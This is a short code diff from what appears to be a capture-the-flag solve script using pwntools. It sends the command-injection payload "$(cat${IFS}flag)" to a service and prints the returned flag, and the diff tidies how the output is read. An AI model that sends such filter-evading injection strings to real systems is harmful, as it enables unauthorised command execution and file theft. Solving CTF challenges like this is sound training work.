@@ -30,16 +30,11 @@ p.interactive()
 """
 p.recvuntil(b":")
 p.recvuntil(b" ")
-p.sendline("$(cat${IFS}flag)")
-flag = []
+p.sendline(b"$(cat${IFS}flag)")
 
-#get all info
-try:
-	while True:
-		flag.append(p.recvline())
-finally:
-	print(flag)
-	break
+print("reading start")
+print(p.recvline())	#remove "goodjob! \n"
+print(p.recvline())	#get flag
 """
 		
 		
